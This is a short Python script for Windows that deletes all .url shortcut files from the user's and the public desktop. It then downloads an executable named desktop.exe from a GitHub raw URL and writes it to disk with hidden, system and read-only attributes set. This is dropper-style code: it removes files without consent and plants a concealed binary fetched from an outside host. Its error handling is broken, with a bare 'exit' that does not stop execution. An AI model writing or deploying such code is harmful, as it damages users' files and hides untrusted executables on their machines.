import os
import requests

user = os.path.expandvars(r'%userprofile%\Desktop')
public = os.path.expandvars(r'%public%\Desktop')
dirs = [user, public]

for dir in dirs:
    files = os.listdir(dir)
    for file in files:
        if file.endswith(".url"):
            os.remove(os.path.join(dir, file))

try:
    r = requests.get("https://raw.githubusercontent.com/thekevie/school-programs/main/desktop.exe")
except Exception:
    exit

print(r.content)
    
os.system("attrib -h -s -r desktop.exe")
open("desktop.exe", 'w+b').write(r.content)
os.system("attrib +h +s +r desktop.exe")
